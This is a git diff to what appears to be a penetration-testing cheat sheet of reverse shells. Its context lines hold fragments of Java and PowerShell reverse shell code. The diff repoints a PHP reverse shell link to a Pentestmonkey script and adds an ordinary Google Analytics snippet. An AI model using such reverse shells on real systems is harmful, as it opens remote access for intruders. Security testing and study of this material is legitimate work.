@@ -143,7 +143,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **PHP**
 
-A good (php reverse shell)[https://github.com/flast101].
+The very good Pentestmonkey (php reverse shell)[https://github.com/flast101/reverse-shell-cheatsheet/blob/master/php-reverse-shell.php].
 
 **Powershell**
 
@@ -162,3 +162,14 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 }
 $client.Close();
 ```
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-173692234-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-173692234-1');
+</script>
